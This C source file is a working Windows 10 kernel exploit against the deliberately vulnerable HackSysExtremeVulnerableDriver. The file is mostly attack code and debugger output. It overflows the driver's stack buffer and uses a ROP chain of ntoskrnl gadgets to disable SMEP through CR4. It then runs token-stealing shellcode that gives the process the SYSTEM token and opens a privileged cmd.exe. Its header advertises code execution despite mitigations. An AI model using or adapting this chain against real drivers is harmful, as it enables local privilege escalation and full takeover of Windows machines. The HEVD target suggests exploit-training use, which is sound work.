

/*
 <---- 
 
 	this very simplified rop chain will get you code execution on the latest win build
 	and intel firmware dispite Mitigations.
	
	i think is best to recompile the asseambly & See that Rip gets populated by nt!IofCallDriver+0x59,
	address and not to expect the nops to slide you to that addr.
	
 
 	it needs ntoskrnl base address or alternatively a kernel pointer leak.
	Copy & usage of this software are allowed without any restrictions.

	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
	
	NOTE: Recovery from the ShellCode is up to you 
	& depands on your specific Exploit...
	i can only guarantee Code Execution.

 ---->
*/


#pragma once
#pragma comment(lib, "Psapi.lib ")
#pragma comment(lib, "Kernel32.lib")
#pragma comment(lib, "ntdll.lib")

#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <stdio.h>
#include <tchar.h>

#pragma warning(disable: 6320) 
#pragma warning(disable: 4201) 

#define hDev "\\\\.\\HackSysExtremeVulnerableDriver"
#define RipOffset 0x808
#define BuffSize 2152
#define IOCTL 0x222003

//
// Gagdets Summery:
//

/*
************* Symbol Path validation summary **************
Response                         Time (ms)     Location
Deferred                                       srv*
Symbol search path is: srv*
Executable search path is:
Windows 10 Kernel Version 16281 MP (1 procs) Free x64
Built by: 16281.1000.amd64fre.rs3_release.170829-1438
Machine Name:
Kernel base = 0xfffff803`a8a10000 PsLoadedModuleList = 0xfffff803`a8d79f70
System Uptime: 0 days 0:00:00.419
KDTARGET: Refreshing KD connection
Break instruction exception - code 80000003 (first chance)

kd> uf nt!KiFlushCurrentTbWorker
nt!KiFlushCurrentTbWorker:
fffff803`a8ab9b0c 0f20e1          mov     rcx,cr4
fffff803`a8ab9b0f 84c9            test    cl,cl
fffff803`a8ab9b11 790f            jns     nt!KiFlushCurrentTbWorker+0x16 (fffff803`a8ab9b22)  Branch

nt!KiFlushCurrentTbWorker+0x7:
fffff803`a8ab9b13 488bc1          mov     rax,rcx
fffff803`a8ab9b16 480fbaf007      btr     rax,7
fffff803`a8ab9b1b 0f22e0          mov     cr4,rax
fffff803`a8ab9b1e 0f22e1          mov     cr4,rcx <<<< -- gadget..
fffff803`a8ab9b21 c3              ret

nt!KiFlushCurrentTbWorker+0x16:
fffff803`a8ab9b22 0f20d8          mov     rax,cr3
fffff803`a8ab9b25 0f22d8          mov     cr3,rax
fffff803`a8ab9b28 c3              ret

kd> ? fffff803`a8ab9b1e - 0xfffff803`a8a10000
Evaluate expression: 695070 = 00000000`000a9b1e <<< -- offset from Ntoskrnl...

kd> uf nt!HvlEndSystemInterrupt
nt!HvlEndSystemInterrupt:
fffff803`a8b8d950 4851            push    rcx
fffff803`a8b8d952 50              push    rax
fffff803`a8b8d953 52              push    rdx
fffff803`a8b8d954 65488b142508620000 mov   rdx,qword ptr gs:[6208h]
fffff803`a8b8d95d b970000040      mov     ecx,40000070h
fffff803`a8b8d962 0fba3200        btr     dword ptr [rdx],0
fffff803`a8b8d966 7206            jb      nt!HvlEndSystemInterrupt+0x1e (fffff803`a8b8d96e)  Branch

nt!HvlEndSystemInterrupt+0x18:
fffff803`a8b8d968 33c0            xor     eax,eax
fffff803`a8b8d96a 8bd0            mov     edx,eax
fffff803`a8b8d96c 0f30            wrmsr

nt!HvlEndSystemInterrupt+0x1e:
fffff803`a8b8d96e 5a              pop     rdx
fffff803`a8b8d96f 58              pop     rax
fffff803`a8b8d970 59              pop     rcx  <<< --- gadget...
fffff803`a8b8d971 c3              ret

kd> ? fffff803`a8b8d970 - 0xfffff803`a8a10000
Evaluate expression: 1562992 = 00000000`0017d970 << -- offset..


kd> uf nt!KiConfigureDynamicProcessor
nt!KiConfigureDynamicProcessor:
fffff803`e223ec38 4883ec28        sub     rsp,28h
fffff803`e223ec3c e87b49ffff      call    nt!KiEnableXSave (fffff803`e22335bc)
fffff803`e223ec41 4883c428        add     rsp,28h
fffff803`e223ec45 c3              ret
kd> uf nt!KiEnableXSave
nt!KiEnableXSave:
fffff803`e22335bc 0f20e1          mov     rcx,cr4
fffff803`e22335bf 48f7054e4bfdff00008000 test qword ptr [nt!KeFeatureBits (fffff803`e2208118)],800000h
fffff803`e22335ca b800000400      mov     eax,40000h
fffff803`e22335cf 0f8450740000    je      nt!KiEnableXSave+0x7469 (fffff803`e223aa25)  Branch

nt!KiEnableXSave+0x19:
fffff803`e22335d5 4885c8          test    rax,rcx
fffff803`e22335d8 7453            je      nt!KiEnableXSave+0x71 (fffff803`e223362d)  Branch

nt!KiEnableXSave+0x1e:
fffff803`e22335da 48bad803000080f7ffff mov rdx,0FFFFF780000003D8h
fffff803`e22335e4 33c9            xor     ecx,ecx
fffff803`e22335e6 488b12          mov     rdx,qword ptr [rdx]
fffff803`e22335e9 488bc2          mov     rax,rdx
fffff803`e22335ec 48c1ea20        shr     rdx,20h
fffff803`e22335f0 0f01d1          xsetbv
fffff803`e22335f3 48baf005000080f7ffff mov rdx,0FFFFF780000005F0h
fffff803`e22335fd 488b12          mov     rdx,qword ptr [rdx]
fffff803`e2233600 4885d2          test    rdx,rdx
fffff803`e2233603 0f8509740000    jne     nt!KiEnableXSave+0x7456 (fffff803`e223aa12)  Branch

nt!KiEnableXSave+0x4d:
fffff803`e2233609 65488b0c2520000000 mov   rcx,qword ptr gs:[20h]
fffff803`e2233612 488d81f0010000  lea     rax,[rcx+1F0h]
fffff803`e2233619 483981c0620000  cmp     qword ptr [rcx+62C0h],rax
fffff803`e2233620 740a            je      nt!KiEnableXSave+0x70 (fffff803`e223362c)  Branch

nt!KiEnableXSave+0x66:
fffff803`e2233622 8189c862000040001000 or  dword ptr [rcx+62C8h],100040h

nt!KiEnableXSave+0x70:
fffff803`e223362c c3              ret  Branch

nt!KiEnableXSave+0x71:
fffff803`e223362d 480bc8          or      rcx,rax
fffff803`e2233630 0f22e1          mov     cr4,rcx
fffff803`e2233633 eba5            jmp     nt!KiEnableXSave+0x1e (fffff803`e22335da)  Branch

nt!KiEnableXSave+0x7456:
fffff803`e223aa12 488bc2          mov     rax,rdx
fffff803`e223aa15 b9a00d0000      mov     ecx,0DA0h
fffff803`e223aa1a 48c1ea20        shr     rdx,20h
fffff803`e223aa1e 0f30            wrmsr
fffff803`e223aa20 e9e48bffff      jmp     nt!KiEnableXSave+0x4d (fffff803`e2233609)  Branch

nt!KiEnableXSave+0x7469:
fffff803`e223aa25 4885c8          test    rax,rcx
fffff803`e223aa28 0f84fe8bffff    je      nt!KiEnableXSave+0x70 (fffff803`e223362c)  Branch

nt!KiEnableXSave+0x7472:
fffff803`e223aa2e 480fbaf112      btr     rcx,12h
fffff803`e223aa33 0f22e1          mov     cr4,rcx <<<--- gadget...
fffff803`e223aa36 c3

kd> ? fffff803`e223aa33 - fffff803`e1e06000
Evaluate expression: 4409907 = 00000000`00434a33 <<-- offset..



kd> dt nt!_EPROCESS poi(nt!KiInitialThread+b8)
+0x000 Pcb              : _KPROCESS
+0x2d8 ProcessLock      : _EX_PUSH_LOCK
+0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
+0x2e8 ActiveProcessLinks : _LIST_ENTRY [ 0xffff8d87`23050328 - 0xfffff803`a8d72ac0 ]
+0x2f8 RundownProtect   : _EX_RUNDOWN_REF
+0x300 Flags2           : 0xd000
+0x300 JobNotReallyActive : 0y0
+0x300 AccountingFolded : 0y0
+0x300 NewProcessReported : 0y0

; compie with nasm:
; nasm.exe sc.asm
;
;	Token Stealing Payload
;	Win10 x64 RS3 16281.
;

[bits 64]

start:

;;push rsp

;; kd> uf nt!PsGetCurrentProcess
;;  nt!PsGetCurrentProcess:
;;  mov   rax,qword ptr gs:[188h]
;;  mov   rax,qword ptr [rax+0B8h]
;;  ret

;; kd> dps gs:188 l1
;;  nt!KiInitialThread

mov rax, [gs:0x188]
mov rax, [rax+0xb8]

;; kd> dt nt!_EPROCESS poi(nt!KiInitialThread+b8)
;;   +0x000 Pcb              : _KPROCESS
;;   [...]
;;   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
;;   +0x2e8 ActiveProcessLinks : _LIST_ENTRY
;;   [...]
;;  +0x358 Token            : _EX_FAST_REF
;;

;; place KiInitialThread+b8
;; in rbx.

mov rbx, rax
loop:
mov rbx, [rbx+0x2e8]    ;; Get the next process
sub rbx, 0x2e8
mov rcx, [rbx+0x2e0]	;; place process in rcx
cmp rcx, 4		;; Compare to System pid.
jnz loop

mov rcx, [rbx + 0x358]
and cl, 0xf0		;; Null the token
mov [rax + 0x358], rcx

;xor rax, rax
;add rsp, 28h
;retn
add rsp, 38h
;;pop rsp
xor rsi, rsi
xor rax, rax
xor rdi, rdi
ret

"\xCC" --> DebugBreak();
"\x65\x48\x8B\x04\x25\x88\x01"
"\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x48\x89"
"\xC3\x48\x8B\x9B\xE8\x02\x00\x00\x48"
"\x81\xEB\xE8\x02\x00\x00\x48\x8B\x8B\xE0\x02\x00\x00\x48\x83\xF9\x04\x75"
"\xE5\x48\x8B\x8B\x58\x03\x00\x00\x80"
"\xE1\xF0\x48\x89\x88\x58\x03\x00\x00\x48\x83\xC4\x38\x48"
"\x31\xF6\x48\x31\xC0\x48\x31\xFF"
"\xCC" --> DebugBreak();
"\xC3"

*/
/*

nt!HvlEndSystemInterrupt+0x1e:
fffff803`bfa1196e 5a              pop     rdx
fffff803`bfa1196f 58              pop     rax
fffff803`bfa11970 59              pop     rcx
fffff803`bfa11971 c3              ret

kd> vertarget
Windows 10 Kernel Version 16281 MP (1 procs) Free x64
Product: WinNt, suite: TerminalServer SingleUserTS Personal
Built by: 16281.1000.amd64fre.rs3_release.170829-1438
Machine Name:
Kernel base = 0xfffff803`bf894000 PsLoadedModuleList = 0xfffff803`bfbfdf70
Debug session time: Wed Sep  6 06:38:12.535 2017 (UTC - 7:00)
System Uptime: 0 days 0:03:33.196
kd> ? fffff803`bfa1196e - fffff803`bf894000
Evaluate expression: 1562990 = 00000000`0017d96e


*/

//
// Get Ntoskrnl ImageBase address,
// to compute the gagdets for disabling
// SMEP.
//
PUCHAR
GetNtos(
)
{
	// defines.
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;

	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

	typedef NTSTATUS(__stdcall *pfZwQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
	);

	DWORD l;
	PSYSTEM_MODULE_INFORMATION Mi;
	PVOID Nt = NULL;

	// Dynamic import.
	pfZwQuerySystemInformation ZwQuerySystemInformation = (pfZwQuerySystemInformation)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");
	ZwQuerySystemInformation(SystemModuleInformation, NULL, NULL, &l);

	// Medium integrity level ( > win7 ),
	// if run from low il, then return NULL.
	Mi = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
		NULL,
		l,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	if (!Mi){return NULL;}

	ZwQuerySystemInformation(SystemModuleInformation, Mi, l, &l);
	Nt = Mi->Module[0].ImageBase;

	// No longer needed, free the memory.
	VirtualFree(Mi, 0, MEM_RELEASE);
	return (PUCHAR)Nt;
}

int main(
	void
)
{

	// To better align the buffer,
	// it is usefull to declare a
	// memory structure, other-wise you will get holes
	// in the buffer and end up with an access violation.
	typedef struct _RopChain {
		PUCHAR HvlEndSystemInterrupt;
		PUCHAR Var;
		PUCHAR KiEnableXSave;
		PUCHAR payload;
		// PUCHAR deviceCallBack;
	} ROPCHAIN, *PROPCHAIN;

	HANDLE dev = CreateFileA(
		hDev,
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	//
	// maybe the driver is not installed,
	// No reason to allocate heap memory 
	// if so.
	if (dev == INVALID_HANDLE_VALUE) {
		exit(GetLastError());
	}

	CHAR sc[] = // "\xCC" // __debugbreak();
		"\x65\x48\x8B\x04"
		"\x25\x88\x01\x00"
		"\x00\x48\x8B\x80\xB8\x00\x00"
		"\x00\x48\x89\xC3\x48\x8B\x9B"
		"\xE8\x02\x00\x00\x48"
		"\x81\xEB"
		"\xE8\x02\x00\x00\x48"
		"\x8B\x8B\xE0\x02"
		"\x00\x00\x48"
		"\x83\xF9\x04\x75"
		"\xE5\x48\x8B\x8B\x58"
		"\x03\x00\x00\x80\xE1\xF0\x48"
		"\x89\x88\x58\x03"
		"\x00\x00\x48\x83\xC4\x68\x48"
		"\x31\xC0\x48\x31\xFF\x48\x31"
		"\xE4"
		// "\xCC" // __debugbreak();
		"\xC3";

	auto pl = VirtualAlloc(
		NULL,
		sizeof(sc),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	memcpy(pl,sc,sizeof(sc));

	auto Ntos = GetNtos();

	if (Ntos == NULL) {
		exit(GetLastError());
	}

	ROPCHAIN Chain;

	// nt!HvlEndSystemInterrupt+0x1e --> Pop Rcx; Retn;
	Chain.HvlEndSystemInterrupt = Ntos + 0x17d970;

	// kd> r cr4
	// ...1506f8
	Chain.Var = (PUCHAR)0x506f8;


	// nt!KiEnableXSave+0x7472 --> Mov Cr4, Rcx; Retn;
	Chain.KiEnableXSave = Ntos + 0x434a33;

	Chain.payload = (PUCHAR)pl;

	/*

	kd> k
	08 ffffb302`61b1e7f0 fffff802`4f85c20b nt!IofCallDriver+0x59
	09 ffffb302`61b1e830 fffff802`4f85ba5f nt!IopSynchronousServiceTail+0x1ab
	0a ffffb302`61b1e8e0 fffff802`4f85b3c6 nt!IopXxxControlFile+0x67f
	0b ffffb302`61b1ea20 fffff802`4f58f953 nt!NtDeviceIoControlFile+0x56
	0c ffffb302`61b1ea90 00007ffd`fae7d6e4 nt!KiSystemServiceCopyEnd+0x13
	0d 00000029`6b9af888 00007ffd`f75a13aa ntdll!NtDeviceIoControlFile+0x14
	0e 00000029`6b9af890 00000000`00000000 0x00007ffd`f75a13aa

	kd> u nt!IofCallDriver+0x59
	nt!IofCallDriver+0x59:
	fffff802`4f425b49 4883c438        add     rsp,38h
	fffff802`4f425b4d c3              ret
	fffff802`4f425b4e 0fb64001        movzx   eax,byte ptr [rax+1]
	fffff802`4f425b52 2c02            sub     al,2
	fffff802`4f425b54 3c01            cmp     al,1
	fffff802`4f425b56 77dc            ja      nt!IofCallDriver+0x44 (fffff802`4f425b34)
	fffff802`4f425b58 488bca          mov     rcx,rdx
	fffff802`4f425b5b e8c4890f00      call    nt!IopPoHandleIrp (fffff802`4f51e524)
	
	 The Call is always in a fixed location from Ntoskrnl...
	*/

	// nt!IofCallDriver+0x59
	LPVOID deviceCallBack = (LPVOID)(Ntos + 0x22b49);

	CHAR *Buff;

	auto len = RipOffset + sizeof(ROPCHAIN) + sizeof(LPVOID);

	/*
	kd> k
	# Child-SP          RetAddr           Call Site
	00 ffffb783`0d0378c8 41414141`41414141 HEVD+0x5708
	01 ffffb783`0d0378d0 41414141`41414141 0x41414141`41414141
	02 ffffb783`0d0378d8 fffff803`a8b8d970 0x41414141`41414141
	03 ffffb783`0d0378e0 fffff803`a8ab9b1e nt!HvlEndSystemInterrupt+0x20
	04 ffffb783`0d0378f0 00000000`00000000 nt!KiFlushCurrentTbWorker+0x12
	*/

	Buff = (CHAR *)malloc(len); 

	// Fill The buffer with Nop's,
	// cuz they dont get access violation.
	RtlSecureZeroMemory(Buff, len);
	RtlFillMemory(Buff, len, 0x90);

	// Rip Offset --> RopChain...
	memcpy(Buff + RipOffset, &Chain, sizeof(ROPCHAIN));

	// Rip Offset + RopChain --> nt!IofCallDriver+0x59
	memcpy(Buff + RipOffset + sizeof(ROPCHAIN), &deviceCallBack, sizeof(LPVOID));

	DWORD Ret = 0;

	try {
		auto yRet = DeviceIoControl(
			dev, IOCTL, Buff,
			BuffSize, NULL, NULL,
			&Ret, (LPOVERLAPPED)NULL
		);
	}
	catch (...) {
	}

	//__debugbreak();

	system("cmd.exe");
	system("pause");
	CloseHandle(dev);
	return 0;
}




